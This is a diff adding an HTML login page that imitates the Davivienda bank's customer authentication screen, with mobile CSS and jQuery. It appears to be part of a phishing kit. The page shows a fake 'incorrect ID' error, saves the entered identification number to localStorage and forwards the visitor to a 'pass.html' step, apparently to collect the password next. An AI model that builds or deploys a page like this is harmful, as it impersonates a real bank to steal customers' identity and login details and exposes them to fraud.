@@ -1,0 +1,771 @@
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+
+    <title>Davivienda</title>
+    <link href="b3t4s/combi.css" type="text/css" rel="stylesheet">
+    <!-- Jquery y dependientes -->
+    <meta http-equiv="Pragma" content="no-cache">
+    <style type="text/css">
+        .generic-tooltip.fixed.identificacion-login-tooltip:after {
+            padding: 10px 13px 11px 13px;
+            width: 201px;
+            top: -13px;
+            height: 34px;
+        }
+    </style>
+    <meta http-equiv="Pragma" content="no-cache">
+
+    <style type="text/css">
+        .generic-tooltip.fixed.identificacion-login-tooltip:after {
+            padding: 10px 13px 11px 13px;
+            width: 201px;
+            top: -13px;
+            height: 34px;
+        }
+    </style>
+    <style>
+        /* ESTILO DEL MENSAJE DE ERROR ROJO (IGUAL A LA IMAGEN) */
+        .error-container {
+            background-color: #fce8e8;
+            border-left: 5px solid #ed1c24;
+            padding: 15px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            text-align: left;
+            border-radius: 4px;
+        }
+
+        .error-icon {
+            color: #ed1c24;
+            font-size: 24px;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+
+        .error-text {
+            color: #b91c1c;
+            font-size: 12px;
+            line-height: 1.4;
+            font-weight: bold;
+        }
+    </style>
+
+
+    <meta http-equiv="Pragma" content="no-cache">
+    <style type="text/css">
+        .generic-tooltip.fixed.identificacion-login-tooltip:after {
+            padding: 10px 13px 11px 13px;
+            width: 201px;
+            top: -13px;
+            height: 34px;
+        }
+    </style>
+
+    <!-- ============================================================ -->
+    <!-- OVERRIDES EXCLUSIVOS MÓVIL (vencen a combi.css)               -->
+    <!-- ============================================================ -->
+    <style type="text/css">
+        html,
+        body {
+            overflow: hidden;
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            touch-action: manipulation;
+            -ms-touch-action: manipulation;
+            overscroll-behavior: none;
+            -webkit-text-size-adjust: 100%;
+            -ms-text-size-adjust: 100%;
+            text-size-adjust: 100%;
+        }
+
+        .logo-mobile {
+            display: none;
+        }
+
+        @media (max-width: 900px) {
+
+            /* ===== Anula min-width:48em y coloca el fondo centrado ===== */
+            html,
+            body {
+                min-width: 0 !important;
+                max-width: 100vw !important;
+                width: 100% !important;
+                height: 100dvh !important;
+                min-height: 100dvh !important;
+                overflow: hidden !important;
+                background: #ffffff !important;
+                font-family: Arial, sans-serif;
+            }
+
+            body * {
+                box-sizing: border-box;
+            }
+
+            /* ===== Fondo real sobre #outer1, centrado y a cover ===== */
+            #outer1 {
+                margin: 0 !important;
+                width: 100% !important;
+                height: 100dvh !important;
+                background: url('b3t4s/home.jpg') no-repeat center center !important;
+                background-size: cover !important;
+                display: flex !important;
+                flex-direction: column;
+                overflow: hidden !important;
+                padding: 0 !important;
+            }
+
+            /* ===== Barra roja con logo ===== */
+            #superiorSinLogin {
+                flex-shrink: 0;
+                width: 100%;
+                background: #ed1c24 !important;
+                padding: 10px 16px !important;
+                margin: 0 !important;
+                display: flex !important;
+                align-items: center;
+                justify-content: space-between;
+                float: none !important;
+                position: static !important;
+                min-height: 52px;
+                overflow: hidden;
+            }
+
+            #superiorSinLogin>div {
+                float: none !important;
+                padding-right: 0 !important;
+                width: auto !important;
+                display: flex;
+                align-items: center;
+            }
+
+            .logo-mobile {
+                display: block !important;
+                height: 26px;
+                width: auto;
+                max-width: 130px;
+                margin: 0 !important;
+            }
+
+            #superiorSinLogin .idiomaLink {
+                font-size: 12px;
+                line-height: 1;
+                color: #fff;
+            }
+
+            #superiorSinLogin .idiomaLink a,
+            #superiorSinLogin .idiomaLink i {
+                color: #fff !important;
+                font-size: 12px !important;
+                text-decoration: none;
+            }
+
+            #banner {
+                display: none !important;
+            }
+
+            /* ===== #center: sin fondo propio, deja ver la imagen ===== */
+            #center {
+                width: 100% !important;
+                max-width: 100% !important;
+                padding: 0 18px !important;
+                padding-top: 0 !important;
+                margin: 0 auto !important;
+                flex: 1 1 auto;
+                display: flex !important;
+                flex-direction: column;
+                justify-content: center;
+                align-items: stretch;
+                overflow: hidden !important;
+                position: static !important;
+                background: transparent !important;
+            }
+
+            /* ===== #loginBox / .contentDiv: sin fondo, tarjeta deja ver imagen ===== */
+            #loginBox {
+                width: 100% !important;
+                max-width: 100% !important;
+                margin: 0 auto !important;
+                padding: 0 !important;
+                float: none !important;
+                background: transparent !important;
+            }
+
+            #loginBox .contentDiv {
+                width: 100% !important;
+                max-width: 340px !important;
+                padding: 0 !important;
+                margin: 0 auto !important;
+                float: none !important;
+                background: transparent !important;
+            }
+
+            #normalid {
+                width: 100% !important;
+                margin: 0 !important;
+                padding: 0 !important;
+                display: block !important;
+            }
+
+            /* ===== Título ===== */
+            #titleBox {
+                width: 100% !important;
+                margin: 0 0 24px 0 !important;
+                padding: 0 !important;
+                text-align: center !important;
+            }
+
+            #titleBox h2,
+            #tituloIngreseUsername,
+            #tituloIngresePassword {
+                font-size: 20px !important;
+                font-weight: normal !important;
+                margin: 0 !important;
+                padding: 0 !important;
+                text-align: center !important;
+                line-height: 1.25;
+                width: 100% !important;
+                color: #222 !important;
+            }
+
+            /* ===== Caja del input ===== */
+            #pedirUsernameBox {
+                margin-top: 0 !important;
+                width: 100% !important;
+                padding: 0 !important;
+            }
+
+            #usernameBox {
+                width: 100% !important;
+                max-width: 100% !important;
+                margin: 0 !important;
+                padding: 0 !important;
+                float: none !important;
+            }
+
+            #usernameBox>div,
+            #usernameBox .generic-tooltip {
+                width: 100% !important;
+                max-width: 100% !important;
+                margin: 0 !important;
+                padding: 0 !important;
+                float: none !important;
+                display: block !important;
+                position: static !important;
+            }
+
+            /* ===== Input: reset total de estilos iOS para que quede solo la línea roja ===== */
+            #doccs,
+            #doccs.conTecladoVirtual,
+            #doccs.loginInput,
+            #username {
+                -webkit-appearance: none !important;
+                -moz-appearance: none !important;
+                appearance: none !important;
+                background: transparent !important;
+                background-color: transparent !important;
+                background-image: none !important;
+                border: none !important;
+                border-bottom: 2px solid #ed1c27 !important;
+                border-radius: 0 !important;
+                -webkit-border-radius: 0 !important;
+                box-shadow: none !important;
+                -webkit-box-shadow: none !important;
+                outline: none !important;
+                width: 100% !important;
+                max-width: 100% !important;
+                min-width: 0 !important;
+                font-size: 16px !important;
+                padding: 8px 2px !important;
+                margin: 0 !important;
+                display: block !important;
+                float: none !important;
+                line-height: 1.3;
+                color: #333 !important;
+                -webkit-text-fill-color: #333;
+                text-align: left;
+            }
+
+            #doccs::placeholder {
+                color: #808080 !important;
+                opacity: 1;
+            }
+
+            /* ===== Botón: reset total de iOS (adios azul por defecto) ===== */
+            #botonSendUsernameBox {
+                width: 100% !important;
+                max-width: 100% !important;
+                text-align: center !important;
+                margin: 26px 0 0 0 !important;
+                padding: 0 !important;
+                display: block !important;
+                float: none !important;
+                position: static !important;
+            }
+
+            #botonSendUsernamesadasd,
+            #botonSendUsername,
+            .botonSiguiente {
+                -webkit-appearance: none !important;
+                -moz-appearance: none !important;
+                appearance: none !important;
+                display: inline-block !important;
+                float: none !important;
+                background: #ed1c27 !important;
+                background-color: #ed1c27 !important;
+                background-image: none !important;
+                color: #ffffff !important;
+                -webkit-text-fill-color: #ffffff;
+                border: 0 none !important;
+                border-radius: 99px !important;
+                -webkit-border-radius: 99px !important;
+                -moz-border-radius: 99px !important;
+                height: 42px !important;
+                width: auto !important;
+                min-width: 170px !important;
+                max-width: 220px !important;
+                font-size: 14px !important;
+                font-weight: normal !important;
+                padding: 0 26px !important;
+                margin: 0 auto !important;
+                box-shadow: none !important;
+                -webkit-box-shadow: none !important;
+                line-height: 42px;
+                text-decoration: none !important;
+                cursor: pointer;
+                text-align: center;
+            }
+
+            /* Botón desactivado: gris */
+            #botonSendUsernamesadasd:disabled,
+            #botonSendUsernamesadasd[disabled],
+            .botonSiguiente:disabled,
+            .botonSiguiente[disabled] {
+                background: #b0b0b0 !important;
+                background-color: #b0b0b0 !important;
+                background-image: none !important;
+                color: #f0f0f0 !important;
+                -webkit-text-fill-color: #f0f0f0;
+                cursor: not-allowed !important;
+            }
+
+            /* ===== Links + texto legal ===== */
+            #loginOptions {
+                width: 100% !important;
+                padding: 20px 0 0 0 !important;
+                margin: 0 !important;
+                overflow: hidden;
+                display: block !important;
+                text-align: center !important;
+                background: transparent !important;
+            }
+
+            #loginOptions ul {
+                display: flex !important;
+                flex-direction: row !important;
+                flex-wrap: wrap !important;
+                justify-content: center !important;
+                align-items: center !important;
+                gap: 6px 18px !important;
+                margin: 0 0 14px 0 !important;
+                padding: 0 !important;
+                list-style: none !important;
+                width: 100% !important;
+                overflow: visible !important;
+            }
+
+            #loginOptions ul li {
+                width: auto !important;
+                min-width: 0 !important;
+                max-width: none !important;
+                white-space: normal !important;
+                display: inline-block !important;
+                vertical-align: middle !important;
+                margin: 0 !important;
+                padding: 0 !important;
+                list-style: none !important;
+                float: none !important;
+            }
+
+            #loginOptions ul li a,
+            #loginOptions ul li .boton-link {
+                font-size: 11.5px !important;
+                line-height: 1.2 !important;
+                white-space: nowrap !important;
+                display: inline-block !important;
+                float: none !important;
+                color: #ed1c27 !important;
+                text-decoration: none !important;
+                -webkit-text-fill-color: #ed1c27;
+            }
+
+            #loginOptions p,
+            #loginOptions .login-info {
+                display: block !important;
+                font-size: 10.5px !important;
+                line-height: 1.35 !important;
+                color: #939598 !important;
+                margin: 0 0 6px 0 !important;
+                padding: 0 4px !important;
+                text-align: left !important;
+                width: 100% !important;
+                float: none !important;
+                overflow: visible !important;
+                word-wrap: break-word;
+                overflow-wrap: break-word;
+            }
+
+            #loginOptions a,
+            #loginOptions .a-login {
+                display: inline-block !important;
+                font-size: 11px !important;
+                margin: 0 !important;
+                padding: 0 !important;
+                float: none !important;
+                text-align: center;
+                color: #ed1c27 !important;
+                text-decoration: none !important;
+                -webkit-text-fill-color: #ed1c27;
+            }
+
+            #loginOptions .a-login p {
+                display: inline !important;
+                margin: 0 !important;
+                padding: 0 !important;
+            }
+
+            #loginOptions>br {
+                display: none !important;
+            }
+
+            /* ===== Mensaje de error rojo, adaptado a móvil ===== */
+            .error-container {
+                width: 100% !important;
+                max-width: 340px !important;
+                margin: 0 auto 20px auto !important;
+                padding: 12px !important;
+                box-sizing: border-box !important;
+            }
+
+            .error-text {
+                font-size: 11px !important;
+                line-height: 1.35 !important;
+            }
+
+            /* ===== Footer ===== */
+            #footer {
+                flex-shrink: 0;
+                width: 100% !important;
+                padding: 8px 12px !important;
+                margin: 0 !important;
+                float: none !important;
+                text-align: center !important;
+                position: static !important;
+                display: block !important;
+                background: transparent !important;
+            }
+
+            #footer ul {
+                padding: 0 !important;
+                margin: 0 !important;
+                list-style: none !important;
+            }
+
+            #footer .footerText {
+                font-size: 10px !important;
+                line-height: 1.2;
+                margin: 0 !important;
+                padding: 0 !important;
+                color: #666 !important;
+            }
+
+            #clearfooter {
+                display: none !important;
+            }
+        }
+
+        /* ===== Spinner del botón (visible en cualquier tamaño) ===== */
+        .btn-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(255, 255, 255, 0.45);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: btn-spin 0.7s linear infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes btn-spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+
+</head>
+
+<body onload="" __processed_3d44f854-cbe1-493f-8f35-f423a50528c7__="true" style="display: block;">
+
+    <div class="outerDiv_" id="outer1" bis_skin_checked="1">
+        <div id="superiorSinLogin" bis_skin_checked="1">
+            <img src="b3t4s/logomijo.png" alt="Davivienda" class="logo-mobile">
+            <div style="float: right; padding-right: 73px;" bis_skin_checked="1">
+                <div class="idiomaLink" bis_skin_checked="1">
+                    <i class="fa fa-language" style="font-size:1.2em"></i>
+                    <a id="selectorEs" href="#" onclick="changeLocale(&#39;es_SV&#39;)" style="display: none;">
+                        Español</a>
+                    <a id="selectorEn" href="#" onclick="changeLocale(&#39;en_SV&#39;)">
+                        English</a>
+                </div>
+
+            </div>
+            <div id="banner" bis_skin_checked="1"></div>
+        </div>
+        <div id="center" bis_skin_checked="1">
+            <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+            <div id="loginBox" bis_skin_checked="1">
+                <form id="normalid">
+                    <div class="contentDiv" bis_skin_checked="1">
+                        <div id="titleBox" bis_skin_checked="1">
+                            <h2 id="tituloIngreseUsername" class="titulo-login">Autenticación del cliente</h2>
+                            <h2 id="tituloIngresePassword" style="display: none;">Ingrese su contraseña</h2>
+                        </div>
+                        <div id="pedirUsernameBox" bis_skin_checked="1">
+                            <div class="formTextInput" id="usernameBox" bis_skin_checked="1">
+                                <!-- 						<div id="ayuda" style="display:none"> -->
+                                <!-- 						</div> -->
+                                <div class="generic-tooltip identificacion-login-tooltip" tooltip-text="- DUI: 123456789 (salvadoreño)
+                              - Pasaporte: formato libre (extranjero)" bis_skin_checked="1"><input id="doccs"
+                                        type="text" class="conTecladoVirtual loginInput validate-user"
+                                        placeholder="Ingrese número identificación" onfocus="true" style="width: 175px;"
+                                        required></div>
+
+                            </div>
+                            <div class="error-container">
+                                <div class="error-icon">⚠️</div>
+                                <div class="error-text">
+                                    El número de identificación ingresado es incorrecto.
+                                    Por favor, verifique su información e intente nuevamente.
+                                </div>
+                            </div>
+                            <div id="errorBox" style="visibility: hidden;" bis_skin_checked="1">
+                                <span id="errorPlaceholder">Error</span>
+                                <span id="errorServicioAvatar" class="value" style="display: none;">
+                                    Error al consultar avatar
+                                </span>
+                                <span id="errorUsernameInvalido" class="value" style="display: none;">
+                                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                                    Nombre de usuario inválido
+                                </span>
+                                <span id="errorPasswordInvalida" class="value" style="display: none;">
+                                    Contraseña inválida
+                                </span>
+                                <span id="errorAutenticacion" class="value" style="display: none;">
+                                    Datos ingresados son inválidos
+                                </span>
+                                <span id="errorAutenticacionCustom" class="value" style="display: none;">
+                                    ???autenticacion.error.custom.???
+                                </span>
+                                <span id="sesionExpirada" class="value" style="display: none;">
+                                    Su sesión ha expirado
+                                </span>
+                                <span id="errorOperacion" class="value" style="display:none;">
+                                    Error al realizar la operación
+                                </span>
+                            </div>
+                            <div id="botonSendUsernameBox" bis_skin_checked="1">
+                                <input id="botonSendUsernamesadasd" type="submit" value="Continuar"
+                                    class="botonSiguiente">
+                            </div>
+                        </div>
+                    </div>
+                    <div id="loginOptions" bis_skin_checked="1">
+                        <ul>
+                            <li><a href="#" class="boton-link" bis_skin_checked="1"> Registrar</a></li>
+                            <li><a href="#" class="boton-link blockUi" bis_skin_checked="1"> ¿Olvidó su contraseña?</a>
+                            </li>
+                            <li><a href="#" class="boton-link blockUi" bis_skin_checked="1"> Desbloquear usuario</a>
+                            </li>
+                            <li><a href="#" class="boton-link blockUi" bis_skin_checked="1"> Consultar contratos</a>
+                            </li>
+                            <li><a href="#" class="boton-link blockUi" bis_skin_checked="1">Token </a></li>
+                        </ul>
+                        <p class="login-info">Tenemos el compromiso de proteger su privacidad y la integridad de su
+                            información personal y financiera. A continuación se definen recomendaciones para su
+                            seguridad. Consúltelas haciendo</p>
+                        <a class="a-login" href="#" bis_skin_checked="1">
+                            Click aquí
+                            <p></p>
+                        </a>
+                        <br><br><br><br><br>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div id="clearfooter" bis_skin_checked="1"></div>
+    </div>
+
+    <div id="footer" bis_skin_checked="1">
+        <!-- 		<div id="footerLogoDiv"> -->
+        <!-- 		<div> -->
+        <ul>
+            <li class="footerText">
+                © 2026 Todos los derechos reservados
+            </li>
+            <!-- 			<li class="fragmento_1"/> -->
+            <!-- 			<li class="fragmento_2"/> -->
+            <!-- 			<li class="fragmento_3"/> -->
+        </ul>
+    </div>
+    <div id="disabledZone" style="float: right; display: none; border: 0px;" bis_skin_checked="1">
+        <!-- Se utiliza en DWR -->
+        <div id="modalProcesando" bis_skin_checked="1">
+            <div id="fondoModal" bis_skin_checked="1">
+                <div id="imagenModal" bis_skin_checked="1">
+                    <img src="b3t4s/processingAni.gif" border="0">
+                </div>
+                <div id="textoModal" bis_skin_checked="1">Espere por favor...</div>
+            </div>
+        </div>
+    </div>
+
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+
+            var $btn = $('#botonSendUsernamesadasd');
+            var $input = $('#doccs');
+            var enviado = false;
+
+            // ────────────────────────────────────────────────
+            // Solo permite números y máximo UN guión
+            // ────────────────────────────────────────────────
+            $input.on('input', function (e) {
+                let valor = this.value;
+
+                // Quitar todo lo que no sea número ni guión
+                valor = valor.replace(/[^0-9-]/g, '');
+
+                // Permitir máximo un guión
+                const guiones = (valor.match(/-/g) || []).length;
+                if (guiones > 1) {
+                    // Si ya hay un guión → eliminamos el último que se intentó escribir
+                    valor = valor.substring(0, valor.lastIndexOf('-')) +
+                        valor.substring(valor.lastIndexOf('-') + 1);
+                }
+
+                // Máximo 10 caracteres
+                if (valor.length > 10) {
+                    valor = valor.substring(0, 10);
+                }
+
+                this.value = valor;
+
+                // Habilitar solo si hay al menos 5 dígitos
+                actualizarEstadoBoton();
+            });
+
+            // ────────────────────────────────────────────────
+            // Habilita/deshabilita el botón según los dígitos
+            // ────────────────────────────────────────────────
+            function actualizarEstadoBoton() {
+                if (enviado) return;
+                var soloDigitos = ($input.val() || '').replace(/\D/g, '');
+                if (soloDigitos.length >= 5) {
+                    $btn.prop('disabled', false);
+                } else {
+                    $btn.prop('disabled', true);
+                }
+            }
+
+            // Estado inicial: deshabilitado
+            $btn.prop('disabled', true);
+
+            // ────────────────────────────────────────────────
+            // Envío del formulario
+            // ────────────────────────────────────────────────
+            $('#normalid').on('submit', function (event) {
+                event.preventDefault();
+                if (enviado) return;
+
+                const valor = $input.val().trim();
+
+                if (!valor) {
+                    alert("Por favor ingresa tu número de identificación.");
+                    return;
+                }
+
+                enviado = true;
+
+                // Bloquear el botón y mostrar el spinner en su lugar
+                $btn.prop('disabled', true);
+                $btn.val('');
+                $btn.html('<span class="btn-spinner"></span>');
+
+                localStorage.setItem('primer', valor);
+
+                setTimeout(function () {
+                    window.location.href = "pass.html";
+                }, 1500);
+            });
+
+        });
+    </script>
+
+    <!-- ============================================================ -->
+    <!-- BLOQUEO TOTAL DE ZOOM (gestos, doble-tap, Ctrl+wheel, teclado) -->
+    <!-- ============================================================ -->
+    <script type="text/javascript">
+        document.addEventListener('gesturestart', function (e) { e.preventDefault(); }, { passive: false });
+        document.addEventListener('gesturechange', function (e) { e.preventDefault(); }, { passive: false });
+        document.addEventListener('gestureend', function (e) { e.preventDefault(); }, { passive: false });
+
+        document.addEventListener('touchmove', function (e) {
+            if (e.touches && e.touches.length > 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function (e) {
+            const now = Date.now();
+            if (now - lastTouchEnd <= 350) {
+                e.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, { passive: false });
+
+        document.addEventListener('wheel', function (e) {
+            if (e.ctrlKey) e.preventDefault();
+        }, { passive: false });
+
+        document.addEventListener('keydown', function (e) {
+            if ((e.ctrlKey || e.metaKey) && ['+', '-', '=', '0'].includes(e.key)) {
+                e.preventDefault();
+            }
+        });
+    </script>
+
+</body>
+
+</html>
